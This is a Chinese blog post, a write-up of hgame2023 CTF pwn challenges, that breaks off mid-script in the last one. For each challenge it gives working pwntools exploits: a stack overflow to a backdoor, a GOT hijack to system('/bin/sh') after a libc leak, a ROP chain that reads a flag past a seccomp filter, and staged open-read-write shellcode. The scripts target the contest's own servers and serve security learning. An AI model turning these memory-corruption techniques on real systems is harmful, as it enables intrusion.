<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32gl-A.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16gl-A.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="复健。">
<meta property="og:type" content="article">
<meta property="og:title" content="hgame2023">
<meta property="og:url" content="http://example.com/2023/01/05/hgame2023/index.html">
<meta property="og:site_name" content="Anza | 学习记录">
<meta property="og:description" content="复健。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/159776/24/33843/7163/63b6c784F98142c24/0da58b7fb1d9c047.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/25967/13/20268/3396/63b6c784Fb27b4e3c/ad354f6b6cdab194.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/128060/20/29852/46558/63b6d8d4Faffade79/9f8aae62c7a0994e.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/59060/18/22803/30759/63b6da2eF20602c20/59d8c4d007e52f4e.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/140425/14/33061/4893/63b83266F5ad1d4fd/c999c86fdd690970.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/218678/6/25270/21739/63b83fb5Fc42dc228/e207fa91b6c24ab5.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/157748/33/33698/56517/63b8408eFc10e2b83/c51017ea28f05343.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/99040/18/33955/52628/63c4b592Fdf5a68c1/c4c2b5bfadb8f836.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/140789/38/32753/51582/63c4b696F25308ff7/31bf55ae390a5057.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/162275/25/34595/91544/63d209b1F634efe7f/8e1d58f50172a469.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/222362/9/23351/7369/63d38f22F7c1ab05c/2d197bc7a6b55b13.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/83542/16/24081/51156/63d39605Fa2a878a1/04cb52e12f5ea5d5.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/196137/37/31783/63481/63d39663Faa66a407/156f7bb626f4a20d.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/33368/1/20074/24348/63d39780F379d4b90/d2d115d721e55e75.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/186253/30/31206/38843/63d396dfFbb6bb1d1/1eb4d20f0f8ca891.png">
<meta property="og:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/31868/14/20447/25602/63d3971eFbb7d2123/dbf9023f33eeddf0.png">
<meta property="article:published_time" content="2023-01-05T12:06:14.000Z">
<meta property="article:modified_time" content="2023-02-01T14:02:32.950Z">
<meta property="article:author" content="Anza">
<meta property="article:tag" content="house_of_botcake">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kjimg10.360buyimg.com/ott/jfs/t1/159776/24/33843/7163/63b6c784F98142c24/0da58b7fb1d9c047.png">

<link rel="canonical" href="http://example.com/2023/01/05/hgame2023/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>hgame2023 | Anza | 学习记录</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Anza | 学习记录" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Anza | 学习记录</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/05/hgame2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Haida.png">
      <meta itemprop="name" content="Anza">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Anza | 学习记录">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          hgame2023
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-01-05 20:06:14" itemprop="dateCreated datePublished" datetime="2023-01-05T20:06:14+08:00">2023-01-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-02-01 22:02:32" itemprop="dateModified" datetime="2023-02-01T22:02:32+08:00">2023-02-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>复健。</p>
<span id="more"></span>

<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>确实<code>easy</code>，直接构造栈溢出即可，要注意后门函数地址+1。</p>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/159776/24/33843/7163/63b6c784F98142c24/0da58b7fb1d9c047.png" style="zoom:80%;" />

<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/25967/13/20268/3396/63b6c784Fb27b4e3c/ad354f6b6cdab194.png" style="zoom:80%;" />

<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">backdoor=<span class="number">0x40117b</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor)*<span class="number">10</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>shell</code>后进行一波重定位即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;2</span><br></pre></td></tr></table></figure>

<h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>典型的负整数越界利用，由未检查下界导致。</p>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128060/20/29852/46558/63b6d8d4Faffade79/9f8aae62c7a0994e.png" style="zoom:80%;" />

<ul>
<li>漏洞允许我们更改下标指向<code>0x10</code>内容，且程序可劫持<code>got</code>表。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<ul>
<li>第一步，劫持<code>exit</code>为<code>vuln</code>函数。</li>
<li>第二步，泄露任意一处<code>got</code>表地址，即泄露<code>libc</code>。</li>
<li>第三步，劫持<code>puts</code>为<code>system</code>，顺便写入<code>/bin/sh</code>。</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/59060/18/22803/30759/63b6da2eF20602c20/59d8c4d007e52f4e.png" style="zoom:80%;" />

<ul>
<li><code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">32413</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">vul=<span class="number">0x4011DA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,p64(vul))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-8&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-9&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>蛮有意思的一道<code>orw</code>题，巩固了一些知识点。</p>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140425/14/33061/4893/63b83266F5ad1d4fd/c999c86fdd690970.png" style="zoom:80%;" />

<p>简单的栈溢出，开了沙箱，禁了<code>system</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004</span><br><span class="line"> 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<ul>
<li>首先泄露<code>libc</code>。</li>
<li>由于溢出的并不多，因此得想办法<strong>增强溢出能力</strong>。一开始想着走一步返回一步，但溢出的数量仍不足以一次性完成如<code>read(3,bss,0x30)</code>这一系列操作。该题比较巧妙的一点是由于是<code>read</code>造成的溢出，我们其实无需控制<code>rdi</code>和<code>rsi</code>，只需增大<code>rdx</code>，并再次调用<code>read</code>即可。</li>
<li>ps. 看了下官方<code>wp</code>使用的是<code>栈迁移</code>和<code>mprotect</code>，感觉不如本方法简单。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31611</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">vul=<span class="number">0x4012C4</span></span><br><span class="line">flag_addr=<span class="number">0x404080</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401393</span></span><br><span class="line">pop_rsi_r13_ret=<span class="number">0x0000000000401391</span></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404020</span>)+p64(elf.sym[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">payload+=p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">openn=libc_base+<span class="number">0x10DCE0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">299</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdx_ret)+p64(<span class="number">0x300</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">264</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_r13_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x40</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+<span class="number">0x10E060</span>)+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>还需注意的点是：</p>
<ol>
<li><code>open</code>和<code>open64</code>是一个东西，当时<code>libc</code>里找半天，发现<code>open64</code>里有这么一句注释：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Alternative name is &#x27;__open&#x27;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用<code>remote</code>远程端口时，<code>read</code>的<code>rdx</code>参数有多大传多少，否则会导致下面<code>send</code>的数据被之前的<code>read</code>吃掉。</li>
</ol>
<h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><p>这种<code>shellcode</code>题目除了掌握基本的<code>orw_shellcode</code>外，要时刻关注执行<code>shellcode</code>前后的寄存器变化，根据寄存器写<code>shellcode</code>。</p>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/218678/6/25270/21739/63b83fb5Fc42dc228/e207fa91b6c24ab5.png" style="zoom:80%;" />

<ul>
<li>首先<code>shellcode</code>有<code>16</code>个字节大小的限制，这也就意味着接下来我们要用<code>16</code>个字节大小限制的<code>shellcode</code>扩大漏洞利用能力。</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/157748/33/33698/56517/63b8408eFc10e2b83/c51017ea28f05343.png" style="zoom:80%;" />

<ul>
<li>调试并根据寄存器编写一下<code>shellcode</code>，目标是写入更多数据到<code>0xcafe0000</code>这片空间并执行：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br></pre></td></tr></table></figure>

<ul>
<li>而后就是编写常规的<code>orw</code>的<code>shellcode</code>，注意开头需要多写一些<code>nop</code>，否则写出的就不是目标<code>flag</code>，猜测是控制相关问题：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>总的<code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31266</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line">io.send(shellcode1)</span><br><span 